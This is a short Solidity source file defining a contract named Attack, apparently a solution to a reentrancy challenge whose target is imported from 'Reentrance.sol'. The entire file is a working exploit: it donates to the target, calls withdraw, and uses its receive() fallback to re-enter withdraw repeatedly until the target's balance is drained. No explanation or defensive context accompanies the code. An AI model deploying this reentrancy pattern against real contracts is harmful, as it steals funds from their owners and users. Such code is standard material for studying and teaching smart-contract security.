// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./Reentrance.sol";

contract Attack {

    address public target;

    constructor(address trg) public {
        target = trg;
    }

    function donate() public payable {
        (bool success, ) = target.call{value: msg.value}(abi.encodeWithSignature("donate(address)", address(this)));
        require(success, "Donate failed");
    }

    function withdraw(uint amnt) external {
        require(target.balance >= amnt, "Amount too high");
        target.call(abi.encodeWithSignature("withdraw(uint256)", amnt));
    }

    receive() external payable{
        if (msg.sender != target)
            return;

        if (msg.value == 0)
            return;
            
        if (target.balance > 0) {
            uint amnt = (msg.value < target.balance) 
                                ? msg.value 
                                : target.balance;

            target.call(abi.encodeWithSignature("withdraw(uint256)", amnt));
        }
    }
}